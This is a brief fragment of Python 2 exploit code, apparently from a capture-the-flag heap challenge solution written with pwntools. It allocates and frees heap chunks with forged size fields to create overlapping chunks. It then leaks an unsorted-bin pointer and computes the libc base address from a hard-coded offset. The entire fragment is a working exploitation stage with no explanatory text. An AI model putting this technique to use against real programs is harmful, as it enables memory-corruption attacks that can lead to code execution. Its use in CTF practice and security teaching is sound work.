	for i in range(2):
		add(0x100, 'a'*0x10)
	add(0x68, 'b')
	add(0x68, 'c')

	add(0x100, '\x00'*0xf0 + p64(0x100) + p64(0x11))
	free(2)
	free(3)
	free(0)

	add(0x68, 'a'*0x60 + p64(0x300))
	dbg()
	free(4)

	add(0x100, 'a'*0x10)
	show(1)
	p.recvline()
	libc_base = u64(p.recvuntil('\x7f').ljust(8, '\x00')) - 0x3c4b78
	print "libc_base ==> ", hex(libc_base)